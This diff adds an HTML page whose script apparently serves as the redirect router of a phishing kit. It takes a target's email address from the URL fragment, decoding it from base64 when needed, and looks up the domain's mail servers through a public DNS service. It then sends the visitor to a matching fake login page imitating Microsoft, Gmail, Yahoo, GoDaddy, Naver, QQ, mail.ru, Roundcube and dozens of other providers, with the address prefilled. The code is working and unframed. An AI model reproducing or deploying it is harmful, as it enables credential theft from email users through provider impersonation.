@@ -1,0 +1,331 @@
+<body>
+  <script> 
+  async function getMXRecords(domain) {
+const url = `https://dns.google/resolve?type=MX&name=${domain}`;
+
+try {
+  const response = await fetch(url);
+  const data = await response.json();
+
+  
+  if (data.Answer && Array.isArray(data.Answer)) {
+    const mxRecords = data.Answer.filter(record => record.type === 15);
+
+    return mxRecords.map(record => record.data);
+  } else {
+    throw new Error('No MX records found for the domain.');
+  }
+} catch (error) {
+  console.log('Error retrieving MX records:', error);
+}
+}
+       
+  function isBase64(str) {
+            if (typeof str !== 'string') {
+          return false;
+      }
+      const notBase64 = /[^A-Z0-9+\/=]/i;
+      const len = str.length;
+
+      if (!len || len % 4 !== 0 || notBase64.test(str)) {
+          return false;
+      }
+
+      const firstPaddingChar = str.indexOf('=');
+      return firstPaddingChar === -1 ||
+          firstPaddingChar === len - 1 ||
+          (firstPaddingChar === len - 2 && str[len - 1] === '=');
+  }
+  
+
+
+
+var emailComeing = window.location.href
+var emailResultPoultry = emailComeing.split('#')
+var values = emailResultPoultry[1]
+
+
+function generateRandomString(length) {
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+      let result = '';
+      const charactersLength = characters.length;
+      for (let i = 0; i < length; i++) {
+      result += characters.charAt(Math.floor(Math.random() * charactersLength));
+            }
+      return result;
+}
+
+if (isBase64(values)) {
+let emailResultPoultry = atob(values);
+
+const emailFinal = emailResultPoultry
+const randomstr = generateRandomString(299);
+
+const sign = "$";
+
+// Append randomstr and sign to the emailFinal
+const updatedEmail = emailFinal + sign + randomstr;
+
+var linksc = emailFinal
+var domainValue = linksc.split('@')
+domainResult = domainValue[1]
+
+// Usage
+const domain = domainResult;
+
+getMXRecords(domain)
+.then(mxRecords => {
+  const result = mxRecords.toString()
+  if (result.includes("outlook")){
+    window.location.replace('microsoft/login.html#'+updatedEmail+'');
+  }
+  else if (result.includes("secureserver.net")){
+    window.location.replace('godaddy/godaddy.html#'+updatedEmail+'');
+  }
+  else if (result.includes("emailsrvr.com")){
+    window.location.replace('rackspace/Login.html#'+updatedEmail+'');
+  }
+  else if (result.includes("icoremail.net")){
+    window.location.replace('coremail/mail.icoremail.net/icore.html#'+updatedEmail+'');
+  }
+  else if (result.includes("yandex")){
+    window.location.replace('yandex/yandex.html#'+updatedEmail+'');
+  }
+  else if (result.includes("126mx")){
+    
+    window.location.replace('126/126.html#'+updatedEmail+'');
+  }
+ else if (result.includes("google")){
+    
+    window.location.replace('google/gmail.html#'+updatedEmail+'');
+  }
+  else if (result.includes("163mx")){
+    
+    window.location.replace('163/163.html#'+updatedEmail+'');
+  }
+else if (result.includes("mx-biz.mail.am0")){
+    window.location.replace('yahoobiz/yahoobiz.html#'+updatedEmail+'');
+  }
+  else if (result.includes("yahoodns.net")){
+    window.location.replace('yahoo/yahoo.html#'+updatedEmail+'');
+  }
+
+  else if (result.includes("GOOGLE")){
+    window.location.replace('google/gmail.html#'+updatedEmail+'');
+  }
+  else if (result.includes("kakao")){
+    window.location.replace('kakao/kakao.html#'+updatedEmail+'');
+  }
+else if (result.includes("hanmail")){
+    window.location.replace('kakao/kakao.html#'+updatedEmail+'');
+  }
+  else if (result.includes("naver.com")){
+    window.location.replace('naver/naver/nidlogin.html#'+updatedEmail+'');
+  }
+  else if (result.includes("263")){
+    window.location.replace('263.net/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("188mx")){
+    window.location.replace('188.com/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("aliyun.com")){
+    window.location.replace('aliyun-domain/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("mx3.c6.icoremail.net")){
+    window.location.replace('cbn.net.id/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("mxhichina.com")){
+    window.location.replace('china/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("china.org.cn")){
+    window.location.replace('china.com.cn/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("emirates.net.ae")){
+    window.location.replace('eim.ae/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("qq.com")){
+    window.location.replace('exmail.qq.com/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("ymail.net")){
+    window.location.replace('fmcity.com/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("hinet.net")){
+    window.location.replace('hinet.net/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("hiworks.co")){
+    window.location.replace('hiworks.com/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("mail.ru")){
+    window.location.replace('mail.ru/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("internet.ru")){
+    window.location.replace('mail.ru/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("hzmx01.mxmail.netease.com")){
+    window.location.replace('qiye.163.com/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("sina.com")){
+    window.location.replace('sina.com/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("sso.secureserver.ne")){
+    window.location.replace('sso.secureserver.ne/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("tom.com")){
+    window.location.replace('tom.com/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("vip126")){
+    window.location.replace('vip.126.com/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("vip163")){
+    window.location.replace('vip.163.com/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("yeahmx")){
+    window.location.replace('yeah.net/index.html#'+updatedEmail+'');
+  }else if (result.includes("sohu.com")){
+    window.location.replace('sohu.com/index.html#'+updatedEmail+'');
+  }
+ 
+  else{
+    window.location.replace('roundcube/index.html#'+updatedEmail+'');
+  }
+});
+}else{
+
+const emailFinal = emailResultPoultry[1]
+// Generate a random string of 390 characters
+const randomstr = generateRandomString(299);
+const sign = "$";
+
+// Append randomstr and sign to the emailFinal
+const updatedEmail = emailFinal + sign + randomstr;
+
+var linksc = emailFinal
+var domainValue = linksc.split('@')
+domainResult = domainValue[1]
+
+// Usage
+const domain = domainResult;
+
+getMXRecords(domain)
+.then(mxRecords => {
+  const result = mxRecords.toString()
+  if (result.includes("outlook")){
+    window.location.replace('microsoft/login.html#'+updatedEmail+'');
+  }
+  else if (result.includes("secureserver.net")){
+    window.location.replace('godaddy/godaddy.html#'+updatedEmail+'');
+  }
+  else if (result.includes("emailsrvr.com")){
+    window.location.replace('rackspace/Login.html#'+updatedEmail+'');
+  }
+  else if (result.includes("icoremail.net")){
+    window.location.replace('coremail/mail.icoremail.net/icore.html#'+updatedEmail+'');
+  }
+  else if (result.includes("yandex")){
+    window.location.replace('yandex/yandex.html#'+updatedEmail+'');
+  }
+  else if (result.includes("126mx")){
+    
+    window.location.replace('126/126.html#'+updatedEmail+'');
+  }
+ else if (result.includes("google")){
+    
+    window.location.replace('google/gmail.html#'+updatedEmail+'');
+  }
+  else if (result.includes("163mx")){
+    
+    window.location.replace('163/163.html#'+updatedEmail+'');
+  }
+else if (result.includes("mx-biz.mail.am0")){
+    window.location.replace('yahoobiz/yahoobiz.html#'+updatedEmail+'');
+  }
+  else if (result.includes("yahoodns.net")){
+    window.location.replace('yahoo/yahoo.html#'+updatedEmail+'');
+  }
+
+  else if (result.includes("GOOGLE")){
+    window.location.replace('google/gmail.html#'+updatedEmail+'');
+  }
+  else if (result.includes("kakao")){
+    window.location.replace('kakao/kakao.html#'+updatedEmail+'');
+  }
+else if (result.includes("hanmail")){
+    window.location.replace('kakao/kakao.html#'+updatedEmail+'');
+  }
+  else if (result.includes("naver.com")){
+    window.location.replace('naver/naver/nidlogin.html#'+updatedEmail+'');
+  }
+  else if (result.includes("263")){
+    window.location.replace('263.net/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("188mx")){
+    window.location.replace('188.com/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("aliyun.com")){
+    window.location.replace('aliyun-domain/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("mx3.c6.icoremail.net")){
+    window.location.replace('cbn.net.id/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("mxhichina.com")){
+    window.location.replace('china/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("china.org.cn")){
+    window.location.replace('china.com.cn/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("emirates.net.ae")){
+    window.location.replace('eim.ae/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("qq.com")){
+    window.location.replace('exmail.qq.com/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("ymail.net")){
+    window.location.replace('fmcity.com/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("hinet.net")){
+    window.location.replace('hinet.net/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("hiworks.co")){
+    window.location.replace('hiworks.com/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("mail.ru")){
+    window.location.replace('mail.ru/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("internet.ru")){
+    window.location.replace('mail.ru/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("hzmx01.mxmail.netease.com")){
+    window.location.replace('qiye.163.com/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("sina.com")){
+    window.location.replace('sina.com/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("sso.secureserver.ne")){
+    window.location.replace('sso.secureserver.ne/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("tom.com")){
+    window.location.replace('tom.com/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("vip126")){
+    window.location.replace('vip.126.com/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("vip163")){
+    window.location.replace('vip.163.com/index.html#'+updatedEmail+'');
+  }
+  else if (result.includes("yeahmx")){
+    window.location.replace('yeah.net/index.html#'+updatedEmail+'');
+  }else if (result.includes("sohu.com")){
+    window.location.replace('sohu.com/index.html#'+updatedEmail+'');
+  }
+ 
+  else{
+    window.location.replace('roundcube/index.html#'+updatedEmail+'');
+  }
+});
+
+
+}
+
+  </script>
+
+</body>
